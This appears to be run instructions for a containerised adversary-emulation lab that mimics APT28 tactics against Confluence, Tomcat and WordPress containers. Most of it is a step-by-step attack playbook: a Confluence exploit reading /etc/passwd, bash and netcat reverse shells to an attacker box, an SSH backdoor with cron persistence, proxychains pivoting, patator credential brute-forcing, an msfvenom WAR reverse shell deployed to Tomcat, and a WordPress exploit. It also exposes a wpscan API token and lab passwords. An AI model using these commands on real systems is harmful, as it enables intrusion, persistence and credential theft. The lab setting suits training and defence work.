 Run time instructions:
 
 Run the main script with sudo priv - sudo goibhniu.py
 
 By default this will setup and run the following:
 
uwe_postgres:101 is up and running on 172.18.0.17:5432
uwe_confluence:101 is up and running on 172.18.0.19:8090
uwe_httpd:101 is up and running on 172.18.0.13 - "INTERNAL"
uwe_ubuntu:101 is up and running on 172.18.0.200
AttackBox is up and running on 172.18.0.157
elasticsearch:7.17.2 is up and running and can be accessed on 172.18.0.10:9200
kibana:7.17.2 is up and running and can be accessed on 172.18.0.11:5601

The uwe_httpd is set to block traffic to and from the AttackBox IP. So to be able to access the page hosted by this container we need to make sure of proxychains.

Step 1 - Exploit the confluence service, this can be done manually, or through the use of a PoC such as through_the_wire.py (avaliable on github / in the Documents folder). Do this via the AttackBox and you can get a reverse shell

Step 2 - The reverse shell is on the confluence container, as we have our "OS" as a seperate container an easy work around for now is to exec a bash rev shell from the ubuntu container to mimic the reverse shell we got via the above PoC. Netcat will need to be installed on the AttackBox

Step 3 - With a shell on the OS upload the SSH backdoor to the OS container (this is in keeping with APT TTP) and setup the backdoor / persistence

Steps 4+ - Run through the following attacks / TTPS
	proxychains via SSH to access / scan the internal httpd instance
	tar and extract a target folder
	priv esc / brute force admin creds
	etc etc

Some useful instructions / commands below
 
python3 through_the_wire.py --rhost 172.18.0.11 --rport 8090 --lhost 172.18.0.157 --protocol http:// --read-file /etc/passwd
 
python3 through_the_wire.py --rhost 172.18.0.11 --rport 8090 --lhost 172.18.0.157 --protocol http:// --reverse-shell
 
/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1

ssh-keygen -P "" -f .ssh/id_ra

touch authorized_keys
cat id_rsa.pub > authorized_keys

ssh -4 -D 9050 ubuntu@172.18.0.200 -i id_rsa -fN
 
 python3 -m http.server
 
 use of ssh -D & proxychains
 
 * * * * * /root/.ssh/ssh -p 22 -k /root/.ssh/id_rsa
 
 ssh -4 -D 9050 172.18.0.200
 
 proxychains <command>
 
 proxychains nmap -Pn -sT -p80 172.18.0.0/24
 
 

 
 
 ----------------------------------------------------
 
APT28 are known for their targeted bruteforcing which is often spread out over a significant period of time (4 attempts per hour for example). We are mimicing this at a much faster rate for the purpose of the demo (4 attempts per minute)

patator http_fuzz auth_type=basic url=http://172.18.0.20:8080/manager/html user_pass=FILE0 0=seclist_tomcat_default_credentials.txt --rate-limit=60 -t 4 --timeout=10

patator http_fuzz auth_type=basic url=http://172.18.0.20:8080/manager/html user_pass=admin:admin --rate-limit=60 -t 4 --timeout=10
 
nano /usr/bin/patator

https://github.com/lanjelot/patator/issues/174


msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.18.0.157 LPORT=4242 -f war > backup_config.war

curl -T backup_config.war -u 'tomcat:s3cret' http://172.18.0.20:8080/manager/text/deploy?path=/cas




The reverse shell is on the tomcat container, as we have our "OS" as a seperate container an easy work around for now is to exec a bash rev shell from the alpine container to mimic the reverse shell we got.

nc 172.18.0.157 4242 -e /bin/ash


  
 
 ----------------------------------------------------
 
wpscan --url 172.18.0.80 --stealthy -e --api-token OtnYl3AzzwuBC3eAdMBrWLszP9RAsuLoBA3PPEsMa0k

https://github.com/H74N/netcat-binaries/raw/master/nc

----------------------------------------------------

python3 sploit.py http://172.18.0.80/wp-admin/admin-ajax.php 2

Because are target OS is running within another container we will now switch to targeting the OS container itself 

admin:montecarlo

python3 -c "import pty;pty.spawn ('/bin/bash')"
export TERM=xterm
ctrl+z
ssty raw -echo; fg

python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
 
HELO testing.com
MAIL FROM:<hacker@maildomain.com>
RCPT TO:<root@maildomain.com>
DATA
From: god@heaven.com
To: all@humans.com
Subject: Testing

Testing Testing 123
.
QUIT

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
 
